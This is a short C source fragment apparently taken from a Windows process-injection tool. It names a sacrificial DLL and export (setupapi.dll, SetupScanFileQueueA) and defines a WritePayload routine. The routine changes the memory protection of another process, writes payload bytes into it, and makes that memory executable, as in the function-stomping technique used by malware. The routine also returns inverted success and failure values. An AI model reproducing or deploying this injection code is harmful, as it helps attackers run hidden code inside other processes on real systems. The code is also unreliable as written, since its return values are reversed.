
#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


#define		SACRIFICIAL_DLL			"setupapi.dll"
#define		SACRIFICIAL_FUNC		"SetupScanFileQueueA"

BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload,SIZE_T IN sPayloadSize) {
	DWORD dwOldProtection = NULL;
	SIZE_T sNumberOfBytesWritten = NULL;

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] Virtual protect is down !!!!! error : %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {

		printf("[!] WriteProcessMemory Failed With Error : %d \n",GetLastError());
		printf("[!] Bytes Written : %d of %d \n",sNumberOfBytesWritten, sPayloadSize);
		return EXIT_FAILURE;
	}
	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize,PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] Virtual protect is down !!!!! error : %d\n", GetLastError());
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;

}